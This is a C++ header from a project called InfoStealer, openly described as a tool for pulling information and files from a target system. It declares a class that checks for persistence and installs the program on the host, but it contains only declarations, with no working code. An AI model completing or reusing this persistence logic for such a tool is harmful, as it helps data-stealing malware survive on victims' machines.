/* 
* InfoStealer - Extracts information and interesting files from a target system.
* Copyright (C) 2023 Sebastian Hasch - <https://github.com/Zelyson/InfoStealer>
* 
* This program is free software licensed under the GNU General Public License version 3:
* you can redistribute it and/or modify it under the terms of the 
* GNU General Public License version 3 as published by the Free Software Foundation.
* 
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <https://www.gnu.org/licenses/gpl-3.0>.
*/


#pragma once
/**
 * @brief Checks if the program is persistent and if not installs itself to the system.
 * @file persistance.cpp
 * @author Sebastian Hasch
 * @date 27.11.2023
 */

#include <iostream>
#include <shlobj.h>



 /**
  * @brief Checks if the program is persistent and if not installs itself to the system.
  */
class persistance {
private:
    bool checkPersist(char* argv);
    bool makePersistent(char* argv);
    std::wstring fullPath;

public:
    bool persist(char* argv);
    persistance(char* argv);
    ~persistance();
};

